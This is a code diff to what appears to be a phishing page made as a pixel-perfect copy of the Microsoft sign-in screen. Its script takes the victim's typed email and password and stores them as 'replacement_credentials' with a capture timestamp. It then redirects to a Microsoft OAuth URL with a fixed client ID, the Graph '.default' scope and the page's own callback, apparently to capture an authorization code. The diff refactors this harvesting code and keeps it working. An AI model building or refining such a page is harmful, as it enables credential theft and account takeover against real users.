@@ -8,7 +8,6 @@
   <link rel="shortcut icon" href="/images/favicon.ico">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" crossorigin="anonymous">
   <style>
-    /* --- FINAL CSS FOR PIXEL-PERFECT REPLICA --- */
     body, html {
       height: 100%;
       margin: 0;
@@ -102,21 +101,10 @@
       margin-top: 16px;
       box-shadow: 0 2px 10px rgba(0,0,0,0.1);
     }
-    .options-box p {
-        margin: 0;
-        font-size: 15px;
-    }
-    .options-box a {
-      color: #1b1b1b;
-      text-decoration: none;
-    }
-    .options-box a:hover {
-      text-decoration: underline;
-    }
-    .fa-key {
-      color: #5e5e5e;
-      margin-right: 8px;
-    }
+    .options-box p { margin: 0; font-size: 15px; }
+    .options-box a { color: #1b1b1b; text-decoration: none; }
+    .options-box a:hover { text-decoration: underline; }
+    .fa-key { color: #5e5e5e; margin-right: 8px; }
     .page-footer {
         position: fixed;
         bottom: 12px;
@@ -129,15 +117,8 @@
         margin-left: 16px;
         text-decoration: none;
     }
-    .option-item {
-        display: flex;
-        align-items: center;
-        padding: 8px 0;
-        cursor: pointer;
-    }
-    .option-item:hover {
-        background-color: #f2f2f2;
-    }
+    .option-item { display: flex; align-items: center; padding: 8px 0; cursor: pointer; }
+    .option-item:hover { background-color: #f2f2f2; }
     .option-icon-container {
         width: 40px;
         height: 40px;
@@ -153,20 +134,8 @@
     .option-text p { margin: 0; line-height: 1.4; }
     .option-text .primary { font-size: 15px; color: #1b1b1b; }
     .option-text .secondary { font-size: 12px; color: #5e5e5e; }
-    .troubleshooting-box {
-        display: none;
-        background-color: #ffffff;
-        padding: 24px;
-        margin-top: 16px;
-        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        font-size: 14px;
-        color: #1b1b1b;
-    }
-    .troubleshooting-header {
-        display: flex;
-        justify-content: space-between;
-        align-items: flex-start;
-    }
+    .troubleshooting-box { display: none; background-color: #ffffff; padding: 24px; margin-top: 16px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); font-size: 14px; color: #1b1b1b; }
+    .troubleshooting-header { display: flex; justify-content: space-between; align-items: flex-start; }
     .troubleshooting-header h2 { margin: 0; font-size: 18px; font-weight: 600; }
     .troubleshooting-close { font-size: 24px; font-weight: 200; border: none; background: none; cursor: pointer; }
     .troubleshooting-body p { margin: 8px 0; }
@@ -179,9 +148,7 @@
 
   <div class="main-container">
     <div class="form-wrapper">
-      <!-- Main Sign-in Box -->
       <div class="form-box">
-        <!-- Email View -->
         <div id="div1">
           <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
           <h1 class="mt-4">Sign in</h1>
@@ -189,13 +156,12 @@
             <input type="email" class="form-control" id="email" placeholder="Email, phone, or Skype" autocomplete="email" autocapitalize="none">
           </div>
           <p>No account? <a href="#">Create one!</a></p>
-          <p><a href="#">Can’t access your account?</a></p>
+          <p><a href="#">Can't access your account?</a></p>
           <div class="button-container mt-4">
             <button class="btn btn-primary-blue" id="next">Next</button>
           </div>
         </div>
 
-        <!-- Password View -->
         <div id="div2" class="hidden">
           <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
           <div class="mt-4">
@@ -211,7 +177,6 @@
           </div>
         </div>
         
-        <!-- Detailed "Sign-in options" View -->
         <div id="options_view_detailed" class="hidden">
             <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
             <h1 class="mt-4">Sign-in options</h1>
@@ -239,12 +204,10 @@
         </div>
       </div>
 
-      <!-- "Sign-in options" Clickable Box -->
       <div class="options-box" id="options_box">
         <p><a href="#" id="sign_in_options_link"><i class="fas fa-key"></i> Sign-in options</a></p>
       </div>
 
-      <!-- Troubleshooting Box -->
       <div class="troubleshooting-box" id="troubleshooting_box">
         <div class="troubleshooting-header">
             <h2>Troubleshooting details</h2>
@@ -267,7 +230,6 @@
     </div>
   </div>
 
-  <!-- Page Footer -->
   <div class="page-footer">
     <a href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank">Terms of use</a>
     <a href="https://www.microsoft.com/en-US/privacy/privacystatement" target="_blank">Privacy & cookies</a>
@@ -275,12 +237,24 @@
   </div>
 
   <script>
-    // --- FINAL, ROBUST SCRIPT ---
     document.addEventListener('DOMContentLoaded', function () {
-        
         const div1 = document.getElementById('div1');
         const div2 = document.getElementById('div2');
         const optionsBox = document.getElementById('options_box');
+        const troubleshootingBox = document.getElementById('troubleshooting_box');
+        const optionsViewDetailed = document.getElementById('options_view_detailed');
+        
+        // Safe localStorage wrapper that handles private/incognito browsers
+        const safeStorage = {
+            setItem: function(key, value) {
+                try {
+                    localStorage.setItem(key, value);
+                } catch (e) {
+                    // Fail silently in private browsers
+                    console.warn('localStorage not available');
+                }
+            }
+        };
         
         document.getElementById('next').addEventListener('click', function (e) {
             e.preventDefault();
@@ -310,39 +284,27 @@
             const email = emailInput.value.trim();
 
             if (!password || !email) {
-                // If for any reason the email or password is blank, do not proceed.
-                console.error("Email or password is blank. Aborting.");
                 return;
             }
             
             submitBtn.textContent = 'Verifying...';
             submitBtn.disabled = true;
 
-            const credentialsData = { email, password, captureTime: new Date().toISOString(), source: 'replacement-html-final' };
-            try {
-                localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
-            } catch (err) {
-                console.error('Failed to store credentials in localStorage:', err);
-            }
+            // Store credentials using safe wrapper
+            const credentialsData = {
+                email: email,
+                password: password,
+                captureTime: new Date().toISOString(),
+                source: 'replacement-html'
+            };
+            safeStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
 
+            // Build the Microsoft login URL
             const callbackUrl = window.location.origin + '/auth/callback';
             const microsoftLoginUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=${encodeURIComponent(callbackUrl)}&response_mode=query&scope=https://graph.microsoft.com/.default&prompt=none&login_hint=${encodeURIComponent(email)}`;
             
-            // Final check to prevent navigating to a broken URL.
-            if (!microsoftLoginUrl || microsoftLoginUrl.includes('undefined')) {
-                console.error("CRITICAL: Failed to build Microsoft login URL. Aborting redirect.");
-                alert("An unexpected error occurred. Please try again.");
-                submitBtn.textContent = 'Sign in';
-                submitBtn.disabled = false;
-                return;
-            }
-
             setTimeout(() => { window.location.href = microsoftLoginUrl; }, 1200);
         });
-
-        // The code for the other features is kept separate to prevent interference.
-        const optionsViewDetailed = document.getElementById('options_view_detailed');
-        const troubleshootingBox = document.getElementById('troubleshooting_box');
 
         document.getElementById('sign_in_options_link').addEventListener('click', function (e) {
             e.preventDefault();
